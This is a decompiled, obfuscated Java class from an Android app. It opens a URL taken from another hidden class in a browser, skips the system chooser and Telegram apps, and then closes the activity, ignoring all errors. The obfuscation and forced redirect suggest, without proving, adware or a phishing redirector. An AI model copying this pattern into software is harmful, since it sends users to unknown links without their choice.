package com.community.oneroom.p42ywg.q8q0he;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import java.util.Iterator;
import java.util.List;
import org.mvel2.ast.ASTNode;

public final class DeGDvTdDmM implements Runnable {

    private final Context f23329a;

    private final Activity f23330b;

    public DeGDvTdDmM(Activity activity) {
        this.f23330b = activity;
        this.f23329a = activity.getApplicationContext();
    }

    private static String a(ResolveInfo resolveInfo, String str) {
        ActivityInfo activityInfo;
        String str2;
        if (resolveInfo == null || (activityInfo = resolveInfo.activityInfo) == null || (str2 = activityInfo.packageName) == null || str2.length() <= 0) {
            return null;
        }
        if ((str != null && str2.equals(str)) || str2.equals("android") || str2.equals("com.android.intentresolver") || str2.startsWith("org.telegram") || str2.startsWith("com.telegram")) {
            return null;
        }
        return str2;
    }

    private void a(Intent intent) {
        PackageManager packageManager;
        try {
            Context context = this.f23329a;
            if (context == null || (packageManager = context.getPackageManager()) == null) {
                return;
            }
            String packageName = context.getPackageName();
            String strA = a(packageManager.resolveActivity(intent, 65536), packageName);
            if (strA != null) {
                intent.setPackage(strA);
                return;
            }
            List<ResolveInfo> listQueryIntentActivities = packageManager.queryIntentActivities(intent, 0);
            if (listQueryIntentActivities != null) {
                Iterator<ResolveInfo> it = listQueryIntentActivities.iterator();
                while (it.hasNext()) {
                    String strA2 = a(it.next(), packageName);
                    if (strA2 != null) {
                        intent.setPackage(strA2);
                        return;
                    }
                }
            }
        } catch (Throwable th2) {
        }
    }

    @Override
    public void run() {
        String strC;
        try {
            Context context = this.f23329a;
            if (context != null && (strC = CAqdLstwfj.c(context)) != null && strC.length() > 0) {
                Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(strC));
                intent.addCategory("android.intent.category.BROWSABLE");
                intent.addFlags(ASTNode.DEOP);
                a(intent);
                Context context2 = this.f23329a;
                if (context2 != null) {
                    context2.startActivity(intent);
                }
            }
            Activity activity = this.f23330b;
            if (activity != null) {
                activity.finish();
            }
        } catch (Throwable th2) {
            Activity activity2 = this.f23330b;
            if (activity2 != null) {
                activity2.finish();
            }
        }
    }
}
